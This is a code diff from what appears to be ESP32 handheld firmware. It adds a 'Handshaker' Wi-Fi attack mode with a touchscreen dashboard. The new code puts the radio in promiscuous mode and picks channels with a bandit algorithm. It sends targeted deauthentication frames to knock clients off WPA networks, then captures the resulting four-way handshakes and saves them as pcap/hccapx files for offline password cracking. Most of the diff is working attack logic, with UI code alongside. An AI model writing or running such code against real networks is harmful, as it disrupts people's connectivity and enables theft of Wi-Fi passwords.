+                    ESP_LOGI(TAG, "No clients found for '%s' after %d rounds, moving to next target",
+                             target_ap->ssid, rounds_without_client);
+                    break;
+                }
+            }
+
+            if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete) {
+                ESP_LOGI(TAG, "Saving handshake for '%s'...", target_ap->ssid);
+                if (hs_save_handshake_to_sd(ap_idx)) {
+                    hs_ap_targets[ap_idx].has_existing_file = true;
+                    handshake_captured[t] = true;
+                    hs_total_handshakes_captured++;
+                    captured_count++;
+                    ESP_LOGI(TAG, "Handshake #%d captured and saved!", hs_total_handshakes_captured);
+                    pcap_serializer_init();
+                    hs_ui_update_flag = true;
+                }
+            }
+        }
+
+        if (all_done || captured_count >= handshake_target_count) {
+            ESP_LOGI(TAG, "All selected networks captured! Attack complete.");
+            break;
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(1000));
+    }
+
+    esp_wifi_set_promiscuous(false);
+    pcap_serializer_deinit();
+}
+
+static void handshake_attack_task_sniffer(void) {
+    ESP_LOGI(TAG, "Handshake sniffer+D-UCB task started.");
+    ESP_LOGI(TAG, "Channels: %d, D-UCB gamma=%.3f, c=%.1f, dwell=%dms",
+             dual_band_channels_count, DUCB_GAMMA, DUCB_C, HS_DWELL_TIME_MS);
+
+    // Switch to APSTA mode so WIFI_IF_AP is available for raw frame TX
+    wifi_mode_t mode;
+    esp_wifi_get_mode(&mode);
+    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
+        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "",
+            .ssid_len = 0,
+            .ssid_hidden = 1,
+            .channel = 1,
+            .password = "",
+            .max_connection = 0,
+            .authmode = WIFI_AUTH_OPEN
+        }
+    };
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+
+    ducb_init();
+
+    hs_ap_count = 0;
+    hs_client_count = 0;
+    if (hs_ap_targets) memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
+    if (hs_clients) memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));
+
+    pcap_serializer_init();
+    hccapx_serializer_init((const uint8_t *)"", 0);
+
+    wifi_promiscuous_filter_t filt = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
+    };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(hs_sniffer_promiscuous_cb);
+    esp_wifi_set_promiscuous(true);
+
+    ESP_LOGI(TAG, "Promiscuous mode enabled. Sniffing...");
+
+    int64_t last_stats_us = esp_timer_get_time();
+
+    while (handshake_attack_active && !g_operation_stop_requested) {
+        int ch_idx = ducb_select_channel();
+        int channel = ducb_channels[ch_idx].channel;
+        hs_current_channel = channel;
+
+        esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
+
+        // Show best AP on this channel in the UI immediately
+        bool found_target = false;
+        for (int i = 0; i < hs_ap_count; i++) {
+            if (hs_ap_targets[i].channel == channel &&
+                !hs_ap_targets[i].complete && !hs_ap_targets[i].has_existing_file &&
+                hs_ap_targets[i].authmode != WIFI_AUTH_OPEN) {
+                snprintf(hs_current_target_ssid, sizeof(hs_current_target_ssid), "%s", hs_ap_targets[i].ssid);
+                found_target = true;
+                break;
+            }
+        }
+        if (!found_target) {
+            snprintf(hs_current_target_ssid, sizeof(hs_current_target_ssid), "Listening CH %d", channel);
+        }
+        hs_ui_update_flag = true;
+
+        hs_dwell_new_clients = 0;
+        hs_dwell_eapol_frames = 0;
+        vTaskDelay(pdMS_TO_TICKS(HS_DWELL_TIME_MS));
+
+        if (!handshake_attack_active || g_operation_stop_requested) break;
+
+        // Verify radio channel before deauth loop
+        {
+            uint8_t actual_ch;
+            wifi_second_chan_t sec_ch;
+            esp_wifi_get_channel(&actual_ch, &sec_ch);
+            if (actual_ch != (uint8_t)channel) {
+                ESP_LOGW(TAG, "[HS] Channel drift! Radio on %d, expected %d. Correcting.", actual_ch, channel);
+                esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
+                vTaskDelay(pdMS_TO_TICKS(5));
+            }
+        }
+
+        int64_t now = esp_timer_get_time();
+        int deauth_count_this_dwell = 0;
+
+        for (int c = 0; c < hs_client_count && handshake_attack_active; c++) {
+            hs_client_entry_t *cl = &hs_clients[c];
+            if (cl->hs_ap_index < 0 || cl->hs_ap_index >= hs_ap_count) continue;
+            hs_ap_target_t *ap = &hs_ap_targets[cl->hs_ap_index];
+            if (ap->complete || ap->has_existing_file) continue;
+            if (ap->channel != channel) continue;
+            if (ap->authmode == WIFI_AUTH_OPEN) continue;
+            if (cl->last_deauth_us > 0 &&
+                (now - cl->last_deauth_us) < HS_DEAUTH_COOLDOWN_US) continue;
+
+            snprintf(hs_current_target_ssid, sizeof(hs_current_target_ssid), "%s", ap->ssid);
+            snprintf(hs_current_client_mac, sizeof(hs_current_client_mac),
+                     "%02X:%02X:%02X:%02X:%02X:%02X",
+                     cl->mac[0], cl->mac[1], cl->mac[2],
+                     cl->mac[3], cl->mac[4], cl->mac[5]);
+            hs_listening_after_deauth = false;
+            hs_ui_update_flag = true;
+
+            ESP_LOGI(TAG, ">>> Attacking '%s' (RadioCH:%d) - deauth %s <<<",
+                     ap->ssid, channel, hs_current_client_mac);
+
+            size_t ssid_len = strlen(ap->ssid);
+            hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
+
+            hs_send_targeted_deauth(cl->mac, ap->bssid, (uint8_t)channel);
+            cl->last_deauth_us = now;
+            cl->deauthed = true;
+            ap->last_deauth_us = now;
+            deauth_count_this_dwell++;
+
+            if (deauth_count_this_dwell >= 3) break;
+        }
+
+        if (deauth_count_this_dwell > 0) {
+            hs_listening_after_deauth = true;
+            hs_ui_update_flag = true;
+            ESP_LOGI(TAG, "[HS] Listening for handshake on CH %d after %d deauths...", channel, deauth_count_this_dwell);
+            vTaskDelay(pdMS_TO_TICKS(2000));
+            hs_listening_after_deauth = false;
+            hs_ui_update_flag = true;
+        }
+
+        double reward = (double)hs_dwell_new_clients + 3.0 * (double)hs_dwell_eapol_frames;
+        ducb_update(ch_idx, reward);
+        hs_ui_update_flag = true;
+
+        for (int a = 0; a < hs_ap_count; a++) {
+            hs_ap_target_t *ap = &hs_ap_targets[a];
+            if (!ap->complete || ap->has_existing_file) continue;
+
+            ESP_LOGI(TAG, "Saving complete handshake for '%s'...", ap->ssid);
+            size_t ssid_len = strlen(ap->ssid);
+            hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
+
+            if (hs_save_handshake_to_sd(a)) {
+                ap->has_existing_file = true;
+                hs_total_handshakes_captured++;
+                ESP_LOGI(TAG, "Handshake #%d captured! (APs: %d, Clients: %d)",
+                         hs_total_handshakes_captured, hs_ap_count, hs_client_count);
+
+                pcap_serializer_init();
+                for (int j = 0; j < hs_ap_count; j++) {
+                    if (!hs_ap_targets[j].complete && !hs_ap_targets[j].has_existing_file) {
+                        hs_ap_targets[j].beacon_captured = false;
+                    }
+                }
+            }
+        }
+
+        now = esp_timer_get_time();
+        if (now - last_stats_us >= HS_STATS_INTERVAL_US) {
+            int wpa_aps = 0, completed = 0;
+            for (int i = 0; i < hs_ap_count; i++) {
+                if (hs_ap_targets[i].authmode != WIFI_AUTH_OPEN) wpa_aps++;
+                if (hs_ap_targets[i].complete) completed++;
+            }
+            ESP_LOGI(TAG, "[HS-STATS] APs:%d(WPA:%d) Clients:%d Captured:%d Ch:%d",
+                     hs_ap_count, wpa_aps, hs_client_count, hs_total_handshakes_captured, channel);
+            last_stats_us = now;
+        }
+    }
+
+    esp_wifi_set_promiscuous(false);
+    pcap_serializer_deinit();
+}
+
+static void handshake_attack_task(void *pvParameters) {
+    (void)pvParameters;
+    ESP_LOGI(TAG, "Handshake attack task started, mode: %s",
+             handshake_selected_mode ? "selected" : "sniffer+D-UCB");
+    vTaskDelay(pdMS_TO_TICKS(500));
+
+    if (handshake_selected_mode) {
+        handshake_attack_task_selected();
+    } else {
+        handshake_attack_task_sniffer();
+    }
+
     ESP_LOGI(TAG, "Handshake attack task finished.");
-    handshake_cleanup();
-    
-    // NOTE: Do NOT set handshake_attack_task_handle to NULL here!
-    // The stop button will do that after vTaskDelete completes.
-    // Setting it to NULL here creates a race condition where the stop button
-    // might try to free the stack while we're still using it.
-    
-    // Delete self - must be last line
+    // Lightweight shutdown: stop radio but preserve UI data (M1-M4 flags, counters)
+    // so the timer can keep displaying the final capture state.
+    // Full cleanup happens when user presses "Stop & Exit" or navigates away.
+    handshake_attack_active = false;
+    esp_wifi_set_promiscuous(false);
+    handshake_attack_task_handle = NULL;
     vTaskDelete(NULL);
+}
+
+// Timer callback for handshake dashboard UI (every 500ms)
+static void hs_ui_timer_cb(lv_timer_t *timer) {
+    (void)timer;
+    if (!handshake_ui_active) return;
+
+    // Channel indicator
+    if (hs_ui_channel_label) {
+        char ch_buf[32];
+        snprintf(ch_buf, sizeof(ch_buf), "CH %d", hs_current_channel);
+        lv_label_set_text(hs_ui_channel_label, ch_buf);
+    }
+
+    // Current target SSID
+    if (hs_ui_target_label) {
+        if (hs_current_target_ssid[0]) {
+            lv_label_set_text(hs_ui_target_label, hs_current_target_ssid);
+        } else {
+            lv_label_set_text(hs_ui_target_label, "Scanning...");
+        }
+    }
+
+    // Status line (client MAC + listening state)
+    if (hs_ui_status_label) {
+        if (hs_listening_after_deauth) {
+            char st_buf[48];
+            snprintf(st_buf, sizeof(st_buf), LV_SYMBOL_REFRESH " Listening... %s", hs_current_client_mac);
+            lv_label_set_text(hs_ui_status_label, st_buf);
+            lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_GREEN, 0);
+        } else if (hs_current_client_mac[0]) {
+            char st_buf[48];
+            snprintf(st_buf, sizeof(st_buf), LV_SYMBOL_CLOSE " Deauth -> %s", hs_current_client_mac);
+            lv_label_set_text(hs_ui_status_label, st_buf);
+            lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_ORANGE, 0);
+        } else {
+            lv_label_set_text(hs_ui_status_label, "");
+        }
+    }
+
+    // Find the most interesting AP to show M1-M4 progress for
+    int best_ap = -1;
+    if (hs_ap_count > 0) {
+        for (int i = 0; i < hs_ap_count; i++) {
+            if (hs_ap_targets[i].complete && !hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
+        }
+        if (best_ap < 0) {
+            for (int i = 0; i < hs_ap_count; i++) {
+                if (hs_ap_targets[i].complete || hs_ap_targets[i].has_existing_file) continue;
+                if (hs_ap_targets[i].channel == hs_current_channel) { best_ap = i; break; }
+            }
+        }
+        if (best_ap < 0) {
+            for (int i = 0; i < hs_ap_count; i++) {
+                if (!hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
+            }
+        }
+    }
+
+    // Beacon and M1-M4 indicators
+    bool has_beacon = false, m1 = false, m2 = false, m3 = false, m4 = false;
+    if (best_ap >= 0) {
+        has_beacon = hs_ap_targets[best_ap].beacon_captured;
+        m1 = hs_ap_targets[best_ap].captured_m1;
+        m2 = hs_ap_targets[best_ap].captured_m2;
+        m3 = hs_ap_targets[best_ap].captured_m3;
+        m4 = hs_ap_targets[best_ap].captured_m4;
+    }
+
+    if (hs_ui_beacon_label) {
+        lv_label_set_text(hs_ui_beacon_label, has_beacon ? LV_SYMBOL_WIFI : LV_SYMBOL_WARNING);
+        lv_obj_set_style_text_color(hs_ui_beacon_label, has_beacon ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+    }
+    if (hs_ui_m1_label) {
+        lv_label_set_text(hs_ui_m1_label, m1 ? "M1" : "M1");
+        lv_obj_set_style_text_color(hs_ui_m1_label, m1 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+    }
+    if (hs_ui_m2_label) {
+        lv_label_set_text(hs_ui_m2_label, m2 ? "M2" : "M2");
+        lv_obj_set_style_text_color(hs_ui_m2_label, m2 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+    }
+    if (hs_ui_m3_label) {
+        lv_label_set_text(hs_ui_m3_label, m3 ? "M3" : "M3");
+        lv_obj_set_style_text_color(hs_ui_m3_label, m3 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+    }
+    if (hs_ui_m4_label) {
+        lv_label_set_text(hs_ui_m4_label, m4 ? "M4" : "M4");
+        lv_obj_set_style_text_color(hs_ui_m4_label, m4 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+    }
+
+    // Stats
+    if (hs_ui_stats_label) {
+        char stats_buf[128];
+        snprintf(stats_buf, sizeof(stats_buf), "APs: %d   Clients: %d   Captured: %d",
+                 hs_ap_count, hs_client_count, hs_total_handshakes_captured);
+        lv_label_set_text(hs_ui_stats_label, stats_buf);
+    }
 }
 
 static void handshake_yes_btn_cb(lv_event_t *e)
 {
     (void)e;
-    
-    // Check if handshake attack is already running
+
     if (handshake_attack_active || handshake_attack_task_handle != NULL) {
         ESP_LOGW(TAG, "Handshake attack already running");
         return;
     }
-    
-    // Reset stop flag
+
     g_operation_stop_requested = false;
-    
-    // Initialize state
     handshake_target_count = 0;
     handshake_current_index = 0;
     memset(handshake_targets, 0, sizeof(handshake_targets));
     memset(handshake_captured, 0, sizeof(handshake_captured));
-    
-    // Set handshake UI active flag
-    handshake_ui_active = true;
+
     scan_done_ui_flag = false;
-    
-    // Recreate function page with proper title bar (home + screenshot buttons)
-    create_function_page_base("Handshake Attack");
-    
-    // Create scrollable content container (like Evil Twin)
-    lv_obj_t *content = lv_obj_create(function_page);
-    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 70);  // Leave space for header and Stop button
-    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);
-    lv_obj_set_style_bg_color(content, lv_color_make(0, 0, 0), 0);
-    lv_obj_set_style_border_width(content, 0, 0);
-    lv_obj_set_style_pad_all(content, 8, 0);
-    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
-    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
-    lv_obj_set_style_pad_row(content, 6, 0);
-    
-    // Check if networks were selected and prepare targets
+
     if (g_shared_selected_count > 0) {
-        // Selected networks mode
         handshake_selected_mode = true;
         handshake_target_count = g_shared_selected_count;
-        
-        // Copy selected networks to handshake targets
         for (int i = 0; i < g_shared_selected_count; i++) {
             int idx = g_shared_selected_indices[i];
             memcpy(&handshake_targets[i], &g_shared_scan_results[idx], sizeof(wifi_ap_record_t));
         }
     } else {
-        // Scan-all mode
         handshake_selected_mode = false;
-        
-        // Use existing scan results if available
         if (g_shared_scan_count > 0) {
             handshake_target_count = (g_shared_scan_count < MAX_AP_CNT) ? g_shared_scan_count : MAX_AP_CNT;
             memcpy(handshake_targets, g_shared_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
         } else {
-            // Will need to scan - set flag to suppress scan results UI
             handshake_waiting_for_scan = true;
         }
     }
-    
-    // "Attacked Networks:" header
-    lv_obj_t *networks_header = lv_label_create(content);
-    lv_label_set_text(networks_header, "Attacked Networks:");
-    lv_obj_set_style_text_color(networks_header, COLOR_MATERIAL_BLUE, 0);
-    lv_obj_set_style_text_font(networks_header, &lv_font_montserrat_14, 0);
-    
-    // Networks list (scrollable)
-    lv_obj_t *networks_list = lv_obj_create(content);
-    lv_obj_set_size(networks_list, lv_pct(100), 80);
-    lv_obj_set_style_bg_color(networks_list, lv_color_make(20, 20, 20), 0);
-    lv_obj_set_style_border_color(networks_list, COLOR_MATERIAL_BLUE, 0);
-    lv_obj_set_style_border_width(networks_list, 1, 0);
-    lv_obj_set_style_pad_all(networks_list, 4, 0);
-    lv_obj_set_style_pad_row(networks_list, 2, 0);
-    lv_obj_set_flex_flow(networks_list, LV_FLEX_FLOW_COLUMN);
-    
-    if (handshake_target_count == 0 && !handshake_selected_mode) {
-        // Will scan for networks
-        lv_obj_t *scan_label = lv_label_create(networks_list);
-        lv_label_set_text(scan_label, "(Will scan for networks...)");
-        lv_obj_set_style_text_color(scan_label, lv_color_make(180, 180, 180), 0);
-        lv_obj_set_style_text_font(scan_label, &lv_font_montserrat_12, 0);
-    } else {
-        // Show selected/available networks
-        for (int i = 0; i < handshake_target_count; i++) {
-            const wifi_ap_record_t *ap = &handshake_targets[i];
-            char line[100];
-            const char *band = (ap->primary <= 14) ? "2.4GHz" : "5GHz";
-            
-            if (ap->ssid[0] != 0) {
-                snprintf(line, sizeof(line), "%s (Ch%d, %s)\n  %02X:%02X:%02X:%02X:%02X:%02X",
-                         (const char *)ap->ssid, ap->primary, band,
-                         ap->bssid[0], ap->bssid[1], ap->bssid[2],
-                         ap->bssid[3], ap->bssid[4], ap->bssid[5]);
-            } else {
-                snprintf(line, sizeof(line), "[Hidden] (Ch%d, %s)\n  %02X:%02X:%02X:%02X:%02X:%02X",
-                         ap->primary, band,
-                         ap->bssid[0], ap->bssid[1], ap->bssid[2],
-                         ap->bssid[3], ap->bssid[4], ap->bssid[5]);
-            }
-            
-            lv_obj_t *net_label = lv_label_create(networks_list);
-            lv_label_set_text(net_label, line);
-            lv_obj_set_style_text_color(net_label, COLOR_MATERIAL_BLUE, 0);
-            lv_obj_set_style_text_font(net_label, &lv_font_montserrat_12, 0);
-        }
-    }
-    
-    // "Status:" header
-    lv_obj_t *status_header = lv_label_create(content);
-    lv_label_set_text(status_header, "Status:");
-    lv_obj_set_style_text_color(status_header, COLOR_MATERIAL_BLUE, 0);
-    lv_obj_set_style_text_font(status_header, &lv_font_montserrat_14, 0);
-    
-    // Status list (scrollable) - takes remaining space - terminal style (black bg, green text)
-    handshake_status_list = lv_list_create(content);
-    lv_obj_set_size(handshake_status_list, lv_pct(100), 80);
-    lv_obj_set_flex_grow(handshake_status_list, 1);  // Take remaining space
-    lv_obj_set_style_bg_color(handshake_status_list, lv_color_make(0, 0, 0), 0);  // Black background
-    lv_obj_set_style_border_color(handshake_status_list, COLOR_MATERIAL_GREEN, 0);  // Green border
-    lv_obj_set_style_border_width(handshake_status_list, 1, 0);
-    lv_obj_set_style_pad_all(handshake_status_list, 4, 0);
-    lv_obj_set_style_text_color(handshake_status_list, COLOR_MATERIAL_GREEN, 0);  // Green text default
-    
-    // Add initial status
-    if (!handshake_selected_mode && handshake_target_count == 0) {
-        lv_obj_t *item = lv_list_add_text(handshake_status_list, "Scanning for networks...");
-        lv_obj_set_style_text_color(item, COLOR_MATERIAL_GREEN, 0);
-        lv_obj_set_style_bg_color(item, lv_color_make(0, 0, 0), 0);
-    } else {
-        lv_obj_t *item = lv_list_add_text(handshake_status_list, "Starting handshake capture...");
-        lv_obj_set_style_text_color(item, COLOR_MATERIAL_GREEN, 0);
-        lv_obj_set_style_bg_color(item, lv_color_make(0, 0, 0), 0);
-    }
-    
-    // Stop & Exit button at bottom (red, like Deauth)
+
+    create_function_page_base("Handshaker");
+    handshake_ui_active = true;
+
+    // ─── D-UCB Channel indicator (top left) ────────────────────────
+    lv_obj_t *ch_box = lv_obj_create(function_page);
+    lv_obj_set_size(ch_box, 100, 50);
+    lv_obj_align(ch_box, LV_ALIGN_TOP_LEFT, 8, 34);
+    lv_obj_set_style_bg_color(ch_box, lv_color_make(30, 30, 45), 0);
+    lv_obj_set_style_border_color(ch_box, lv_color_make(0, 188, 212), 0);
+    lv_obj_set_style_border_width(ch_box, 2, 0);
+    lv_obj_set_style_radius(ch_box, 10, 0);
+    lv_obj_set_style_pad_all(ch_box, 0, 0);
+    lv_obj_clear_flag(ch_box, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *ch_title = lv_label_create(ch_box);
+    lv_label_set_text(ch_title, "D-UCB");
+    lv_obj_set_style_text_color(ch_title, lv_color_make(0, 188, 212), 0);
+    lv_obj_set_style_text_font(ch_title, &lv_font_montserrat_12, 0);
+    lv_obj_align(ch_title, LV_ALIGN_TOP_MID, 0, 4);
+
+    hs_ui_channel_label = lv_label_create(ch_box);
+    lv_label_set_text(hs_ui_channel_label, "CH --");
+    lv_obj_set_style_text_color(hs_ui_channel_label, lv_color_make(255, 255, 255), 0);
+    lv_obj_set_style_text_font(hs_ui_channel_label, &lv_font_montserrat_16, 0);
+    lv_obj_align(hs_ui_channel_label, LV_ALIGN_BOTTOM_MID, 0, -4);
+
+    // ─── Current target SSID + client status (top center-right) ───
+    lv_obj_t *target_box = lv_obj_create(function_page);
+    lv_obj_set_size(target_box, 362, 50);
+    lv_obj_align(target_box, LV_ALIGN_TOP_LEFT, 116, 34);
+    lv_obj_set_style_bg_color(target_box, lv_color_make(30, 30, 45), 0);
+    lv_obj_set_style_border_color(target_box, lv_color_make(63, 81, 181), 0);
+    lv_obj_set_style_border_width(target_box, 2, 0);
+    lv_obj_set_style_radius(target_box, 10, 0);
+    lv_obj_set_style_pad_all(target_box, 0, 0);
+    lv_obj_clear_flag(target_box, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *tgt_title = lv_label_create(target_box);
+    lv_label_set_text(tgt_title, "TARGET");
+    lv_obj_set_style_text_color(tgt_title, lv_color_make(63, 81, 181), 0);
+    lv_obj_set_style_text_font(tgt_title, &lv_font_montserrat_12, 0);
+    lv_obj_align(tgt_title, LV_ALIGN_TOP_LEFT, 8, 4);
+
+    hs_ui_target_label = lv_label_create(target_box);
+    lv_label_set_text(hs_ui_target_label, "Scanning...");
+    lv_obj_set_style_text_color(hs_ui_target_label, lv_color_make(255, 255, 255), 0);
+    lv_obj_set_style_text_font(hs_ui_target_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_width(hs_ui_target_label, 260);
+    lv_label_set_long_mode(hs_ui_target_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
+    lv_obj_align(hs_ui_target_label, LV_ALIGN_LEFT_MID, 8, -2);
+
+    hs_ui_status_label = lv_label_create(target_box);
+    lv_label_set_text(hs_ui_status_label, "");
+    lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_text_font(hs_ui_status_label, &lv_font_montserrat_12, 0);
+    lv_obj_set_width(hs_ui_status_label, 340);
+    lv_label_set_long_mode(hs_ui_status_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
+    lv_obj_align(hs_ui_status_label, LV_ALIGN_BOTTOM_LEFT, 8, -2);
+
+    // ─── Beacon + M1-M4 Progress row ──────────────────────────────
+    lv_obj_t *progress_box = lv_obj_create(function_page);
+    lv_obj_set_size(progress_box, 464, 60);
+    lv_obj_align(progress_box, LV_ALIGN_TOP_MID, 0, 90);
+    lv_obj_set_style_bg_color(progress_box, lv_color_make(20, 20, 30), 0);
+    lv_obj_set_style_border_color(progress_box, lv_color_make(76, 175, 80), 0);
+    lv_obj_set_style_border_width(progress_box, 2, 0);
+    lv_obj_set_style_radius(progress_box, 10, 0);
+    lv_obj_set_style_pad_all(progress_box, 0, 0);
+    lv_obj_clear_flag(progress_box, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_flex_flow(progress_box, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(progress_box, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+
+    lv_obj_t *hdr_progress = lv_label_create(progress_box);
+    lv_label_set_text(hdr_progress, "HANDSHAKE PROGRESS");
+    lv_obj_set_style_text_color(hdr_progress, lv_color_make(76, 175, 80), 0);
+    lv_obj_set_style_text_font(hdr_progress, &lv_font_montserrat_12, 0);
+    lv_obj_align(hdr_progress, LV_ALIGN_TOP_MID, 0, 2);
+
+    // Beacon icon
+    hs_ui_beacon_label = lv_label_create(progress_box);
+    lv_label_set_text(hs_ui_beacon_label, LV_SYMBOL_WARNING);
+    lv_obj_set_style_text_color(hs_ui_beacon_label, lv_color_make(80, 80, 80), 0);
+    lv_obj_set_style_text_font(hs_ui_beacon_label, &lv_font_montserrat_20, 0);
+
+    // M1-M4 indicators
+    hs_ui_m1_label = lv_label_create(progress_box);
+    lv_label_set_text(hs_ui_m1_label, "M1");
+    lv_obj_set_style_text_color(hs_ui_m1_label, lv_color_make(80, 80, 80), 0);
+    lv_obj_set_style_text_font(hs_ui_m1_label, &lv_font_montserrat_20, 0);
+
+    hs_ui_m2_label = lv_label_create(progress_box);
+    lv_label_set_text(hs_ui_m2_label, "M2");
+    lv_obj_set_style_text_color(hs_ui_m2_label, lv_color_make(80, 80, 80), 0);
+    lv_obj_set_style_text_font(hs_ui_m2_label, &lv_font_montserrat_20, 0);
+
+    hs_ui_m3_label = lv_label_create(progress_box);
+    lv_label_set_text(hs_ui_m3_label, "M3");
+    lv_obj_set_style_text_color(hs_ui_m3_label, lv_color_make(80, 80, 80), 0);
+    lv_obj_set_style_text_font(hs_ui_m3_label, &lv_font_montserrat_20, 0);
+
+    hs_ui_m4_label = lv_label_create(progress_box);
+    lv_label_set_text(hs_ui_m4_label, "M4");
+    lv_obj_set_style_text_color(hs_ui_m4_label, lv_color_make(80, 80, 80), 0);
+    lv_obj_set_style_text_font(hs_ui_m4_label, &lv_font_montserrat_20, 0);
+
+    // ─── Stats bar ────────────────────────────────────────────────
+    hs_ui_stats_label = lv_label_create(function_page);
+    lv_label_set_text(hs_ui_stats_label, "APs: 0   Clients: 0   Captured: 0");
+    lv_obj_set_style_text_color(hs_ui_stats_label, lv_color_make(180, 180, 180), 0);
+    lv_obj_set_style_text_font(hs_ui_stats_label, &lv_font_montserrat_14, 0);
+    lv_obj_align(hs_ui_stats_label, LV_ALIGN_TOP_MID, 0, 160);
+
+    // ─── Stop & Exit button (bottom center) ───────────────────────
     handshake_stop_btn = lv_btn_create(function_page);
     lv_obj_set_size(handshake_stop_btn, 120, 55);
     lv_obj_align(handshake_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
@@ -6261,65 +7580,47 @@ static void handshake_yes_btn_cb(lv_event_t *e)
     lv_obj_set_style_shadow_opa(handshake_stop_btn, LV_OPA_40, 0);
     lv_obj_set_flex_flow(handshake_stop_btn, LV_FLEX_FLOW_COLUMN);
     lv_obj_set_flex_align(handshake_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
-    
+
     lv_obj_t *x_icon = lv_label_create(handshake_stop_btn);
     lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
     lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_20, 0);
     lv_obj_set_style_text_color(x_icon, lv_color_make(255, 255, 255), 0);
-    
+
     lv_obj_t *stop_text = lv_label_create(handshake_stop_btn);
     lv_label_set_text(stop_text, "Stop & Exit");
     lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
     lv_obj_set_style_text_color(stop_text, lv_color_make(255, 255, 255), 0);
-    
+
     lv_obj_add_event_cb(handshake_stop_btn, handshake_stop_btn_cb, LV_EVENT_CLICKED, NULL);
-    
-    // Enable log capture for status updates
+
+    // ─── Start the timer for UI updates ───────────────────────────
+    hs_ui_timer = lv_timer_create(hs_ui_timer_cb, 500, NULL);
+
     handshake_enable_log_capture();
-    
-    // Keep handshake_log_ta as NULL since we're using status list now
     handshake_log_ta = NULL;
-    
-    // Start handshake attack task
+
+    // ─── Start handshake attack task ──────────────────────────────
     handshake_attack_active = true;
-    
-    // Allocate task stack from PSRAM (32KB for safety - vfprintf needs a lot)
+
     handshake_attack_task_stack = (StackType_t *)heap_caps_malloc(32768 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
     if (handshake_attack_task_stack != NULL) {
         handshake_attack_task_handle = xTaskCreateStatic(
-            handshake_attack_task,
-            "handshake_attac",  // Max 15 chars for task name
-            32768,  // Stack size - 32KB in PSRAM
-            NULL,
-            5,     // Priority
-            handshake_attack_task_stack,
-            &handshake_attack_task_buffer
+            handshake_attack_task, "hs_attack", 32768, NULL, 5,
+            handshake_attack_task_stack, &handshake_attack_task_buffer
         );
         if (handshake_attack_task_handle == NULL) {
             ESP_LOGE(TAG, "Failed to create handshake attack task!");
             handshake_attack_active = false;
             heap_caps_free(handshake_attack_task_stack);
             handshake_attack_task_stack = NULL;
-            // Add error to status list
-            lv_obj_t *err_item = lv_list_add_text(handshake_status_list, "ERROR: Failed to create task");
-            lv_obj_set_style_text_color(err_item, COLOR_MATERIAL_RED, 0);
-            lv_obj_set_style_bg_color(err_item, lv_color_make(0, 0, 0), 0);
-        } else {
-            ESP_LOGI(TAG, "Handshake attack task created with PSRAM stack (32KB)");
         }
     } else {
         ESP_LOGE(TAG, "Failed to allocate PSRAM stack for handshake attack task!");
         handshake_attack_active = false;
-        // Add error to status list
-        lv_obj_t *err_item = lv_list_add_text(handshake_status_list, "ERROR: Failed to allocate memory");
-        lv_obj_set_style_text_color(err_item, COLOR_MATERIAL_RED, 0);
-        lv_obj_set_style_bg_color(err_item, lv_color_make(0, 0, 0), 0);
     }
-    
+
     show_touch_dot = false;
-    if (touch_dot) {
-        lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
-    }
+    if (touch_dot) lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
 }
 
 static void handshake_stop_btn_cb(lv_event_t *e)
@@ -6370,6 +7671,8 @@ static void handshake_stop_btn_cb(lv_event_t *e)
         handshake_attack_task_stack = NULL;
     }
     
+    handshake_cleanup();
+
     handshake_attack_active = false;
     handshake_disable_log_capture();
     handshake_log_ta = NULL;
